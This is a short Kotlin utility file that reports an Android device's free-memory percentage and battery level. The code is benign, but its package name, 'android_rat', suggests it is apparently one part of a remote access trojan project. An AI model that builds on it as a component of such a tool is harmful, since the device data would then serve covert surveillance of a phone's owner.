package com.example.android_rat.utils

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.util.Log
import java.io.IOException
import java.io.RandomAccessFile

object DeviceHealthMonitor {

    // Function to get available memory in percentage
    fun getAvailableMemoryPercentage(context: Context): Int {
        val memoryInfo = ActivityManager.MemoryInfo()
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        activityManager.getMemoryInfo(memoryInfo)

        return ((memoryInfo.availMem.toFloat() / memoryInfo.totalMem) * 100).toInt()
    }

    // Function to get battery level in percentage
    fun getBatteryLevel(context: Context): Int {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1

        return if (level == -1 || scale == -1) 50 else ((level / scale.toFloat()) * 100).toInt()
    }
}
